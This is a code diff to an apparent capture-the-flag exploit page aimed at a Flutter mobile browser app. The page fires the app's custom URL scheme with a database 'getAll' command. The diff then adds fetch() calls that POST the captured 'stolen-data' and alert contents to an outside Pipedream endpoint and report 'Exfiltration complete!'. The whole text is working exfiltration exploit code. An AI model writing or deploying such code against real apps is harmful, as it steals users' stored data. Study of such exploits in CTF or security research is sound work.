@@ -34,6 +34,14 @@
             alertBox.textContent = "EXTRACTED DATA: " + message;
             
             document.body.appendChild(alertBox);
+
+            fetch('https://eo1b8md42oge0zj.m.pipedream.net', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type: 'alertData', data: message })
+            }).then(() => {
+                // document.getElementById('exploit-status').innerText = "Data successfully sent to Pipedream!";
+            });
         };
 
         setTimeout(() => {
@@ -49,6 +57,25 @@
             
             // This URL triggers the native 'getAll' branch in the Flutter app
             window.location.href = 'sekurebrowzer://https://yahoo.com?url=https://vini2001.github.io/ctf/index.html&dbCommand=getAll';
+
+            setTimeout(() => {
+                const dataDiv = document.getElementById('stolen-data');
+                if (dataDiv && dataDiv.textContent) {
+                    console.log("Data captured in div!");
+                    
+                    // Send to Pipedream
+                    fetch('https://eo1b8md42oge0zj.m.pipedream.net', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ data: dataDiv.textContent })
+                    }).then(() => {
+                        document.getElementById('exploit-status').innerText = "Exfiltration complete!";
+                    });
+                    
+                    // Stop observing after one capture
+                    disconnect();
+                }
+            }, 2000);
         }, 7000);
     </script>
 </body>
